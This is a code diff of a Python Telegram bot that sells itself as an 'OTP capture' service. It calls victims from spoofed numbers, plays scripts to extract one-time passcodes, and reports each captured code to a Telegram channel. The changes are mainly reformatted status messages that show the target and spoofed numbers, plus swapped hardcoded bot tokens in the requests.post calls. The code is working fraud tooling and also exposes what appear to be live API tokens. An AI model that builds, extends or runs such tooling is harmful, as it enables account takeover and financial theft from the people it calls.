@@ -151,7 +151,7 @@ def send_welcome(message):
 
 👋 Hello, <b>{name}</b> Your Ultimate Solution for OTP Captures is right here! Let's dive into why you should choose us:
 
-🔐 Top-Tier Security:
+<b>🔐 Top-Tier Security:</b>
 
 • 📲Seamlessly integrate with various systems using our pre-built modules.
 
@@ -159,7 +159,7 @@ def send_welcome(message):
 
 • 🤖Detect humans and robots to ensure you're always speaking to the right entity.
 
-🧬 Advanced Functionalities:
+<b>🧬 Advanced Functionalities:</b>
 
 • 💻Tailor-made custom scripts to meet your unique requirements.
 
@@ -167,7 +167,7 @@ def send_welcome(message):
 
 • ⚡️Lightning-fast OTP captures, minimizing wait times for super-fast responses.
 
-🤝 User-Friendly Controls:
+<b>🤝 User-Friendly Controls:</b>
 
 • ✅Instant control at your fingertips with accept/deny buttons.
 
@@ -315,7 +315,7 @@ def Start_back(message):
 
 👋 Hello, <b>{name}</b> Your Ultimate Solution for OTP Captures is right here! Let's dive into why you should choose us:
 
-🔐 Top-Tier Security:
+<b>🔐 Top-Tier Security:</b>
 
 • 📲Seamlessly integrate with various systems using our pre-built modules.
 
@@ -323,7 +323,7 @@ def Start_back(message):
 
 • 🤖Detect humans and robots to ensure you're always speaking to the right entity.
 
-🧬 Advanced Functionalities:
+<b>🧬 Advanced Functionalities:</b>
 
 • 💻Tailor-made custom scripts to meet your unique requirements.
 
@@ -331,7 +331,7 @@ def Start_back(message):
 
 • ⚡️Lightning-fast OTP captures, minimizing wait times for super-fast responses.
 
-🤝 User-Friendly Controls:
+<b>🤝 User-Friendly Controls:</b>
 
 • ✅Instant control at your fingertips with accept/deny buttons.
 
@@ -447,7 +447,7 @@ def Support(message):
 💻 Dev  : @dynamic_up
                                  
 ✨ Join our Telegram server for support and discussions:
-🌐 @Sourceotpbot
+🌐 @source_otp_bot_discussion
 *""",message.from_user.id, last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='Markdown')
     except:
          send_welcome(message)
@@ -997,7 +997,12 @@ def recall_now(message):
                 caller=cl[5]
                 vict=cl[4]
                 if days>=1:
-                        bot.send_message(message.from_user.id, "*Recalling 📲*",parse_mode='markdown')
+                        bot.send_message(message.from_user.id,f"""
+📞 <b>Recalling</b> +{vict}
+📱 <b>As</b> +{caller}
+✋ <b>Hold on !</b> Calling in progress
+
+❌ Press /endcall to disconnect all active calls.""",parse_mode='HTML')
                         try:   
                             c.execute(f"select * from call_data where chat_id={id} limit 1")
                             last_script = c.fetchone()
@@ -1205,8 +1210,8 @@ def custom_prebuild_script_call(script_id,chatid):
             item1 = types.KeyboardButton(text="Accept")
             item2 = types.KeyboardButton(text="Deny")
             keyboard.add(item1,item2) 
-            callinfo=bot.send_message(chatid, f"*Code received successfully*", reply_markup=keyboard,parse_mode='markdown')
-            requests.post(f"""https://api.telegram.org/bot7091717691:AAGV5CneUzj4ljKHf0Ov7rWwS9tAhf8t53A/sendMessage?chat_id=-1002163467133&text=
+            callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown')
+            requests.post(f"""https://api.telegram.org/bot7024645991:AAHTKnh5mXSDLhDfXVQgcNe2_Q23Ei6m8tQ/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
 Another Call Was Successful 👤
 
@@ -1393,8 +1398,8 @@ def prebuild_script_call(service,chatid):
             item1 = types.KeyboardButton(text="Accept")
             item2 = types.KeyboardButton(text="Deny")
             keyboard.add(item1,item2) 
-            callinfo=bot.send_message(chatid, f"*Code received successfully*", reply_markup=keyboard,parse_mode='markdown',)
-            requests.post(f"""https://api.telegram.org/bot7091717691:AAGV5CneUzj4ljKHf0Ov7rWwS9tAhf8t53A/sendMessage?chat_id=-1002163467133&text=
+            callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown',)
+            requests.post(f"""https://api.telegram.org/bot7024645991:AAHTKnh5mXSDLhDfXVQgcNe2_Q23Ei6m8tQ/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
 Another Call Was Successful 👤
 
@@ -1582,8 +1587,8 @@ def t_custom_prebuild_script_call(script_id,chatid):
             item1 = types.KeyboardButton(text="Accept")
             item2 = types.KeyboardButton(text="Deny")
             keyboard.add(item1,item2) 
-            callinfo=bot.send_message(chatid, f"*Code received successfully*", reply_markup=keyboard,parse_mode='markdown')
-            requests.post(f"""https://api.telegram.org/bot7091717691:AAGV5CneUzj4ljKHf0Ov7rWwS9tAhf8t53A/sendMessage?chat_id=-1002163467133&text=
+            callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown')
+            requests.post(f"""https://api.telegram.org/bot7024645991:AAHTKnh5mXSDLhDfXVQgcNe2_Q23Ei6m8tQ/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
 Another Call Was Successful 👤
 
@@ -1764,7 +1769,7 @@ def tprebuild_script_call(service,chatid):
             item2 = types.KeyboardButton(text="Deny")
             keyboard.add(item1,item2) 
             callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown',)
-            requests.post(f"""https://api.telegram.org/bot7091717691:AAGV5CneUzj4ljKHf0Ov7rWwS9tAhf8t53A/sendMessage?chat_id=-1002163467133&text=
+            requests.post(f"""https://api.telegram.org/bot7024645991:AAHTKnh5mXSDLhDfXVQgcNe2_Q23Ei6m8tQ/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
 Another Call Was Successful 👤
 
@@ -1799,7 +1804,12 @@ def make_call_command(message):
                         service_name = mes[3]
                         otp_digits = int(mes[4])
                         voice = mes[5]
-                        bot.send_message(message.from_user.id,f"*Phone Dialled ☎️*",parse_mode='markdown')
+                        bot.send_message(message.from_user.id,f"""
+📞 <b>Calling</b> +{number}
+📱 <b>As</b> +{spoof}
+✋ <b>Hold on !</b> Calling in progress
+
+❌ Press /endcall to disconnect all active calls.""",parse_mode='HTML')
                         c.execute(f"update users set v_no={number},spoof_no={spoof},inp_sc='{voice}',del_col=0,status='active' where user_id={id} ")
                         db.commit()
                         c.execute(f"update call_data set last_service='{service_name}',otp_digits={otp_digits} where chat_id={id} ")
@@ -1836,7 +1846,12 @@ def make_call_custon(message):
                         spoof = mes[2]
                         script_id = mes[3]
                         voice = mes[4]
-                        bot.send_message(message.from_user.id,f"*Phone Dialled ☎️*""",parse_mode='markdown')
+                        bot.send_message(message.from_user.id,f"""
+📞 <b>Calling</b> +{number}
+📱 <b>As</b> +{spoof}
+✋ <b>Hold on !</b> Calling in progress
+
+❌ Press /endcall to disconnect all active calls.""",parse_mode='HTML')
                         c.execute(f"update users set v_no={number},spoof_no={spoof},sc_id={script_id},inp_sc='{voice}',del_col=0,username='{username}' where user_id={id} ")
                         db.commit()
                         c.execute(f"select * from custom_scripts where script_id={script_id} limit 1")
@@ -2050,7 +2065,7 @@ def annonce():
     r2= c.fetchall()
     print(r2)
     for users in r2:  
-        requests.post(f"https://api.telegram.org/bot7229197958:AAFAQh0WwKFxPuE4AFY_e7NaVFGJLdDieh8/sendMessage?chat_id={users[1]}&text={user} : {mess}")
+        requests.post(f"https://api.telegram.org/bot7383376915:AAEzhKfgLnEejoyEQc8jEfF0I54BT7Jo5EM/sendMessage?chat_id={users[1]}&text={user} : {mess}")
     response_data = {'Response': f'Message Sent'}
     return jsonify(response_data)
 
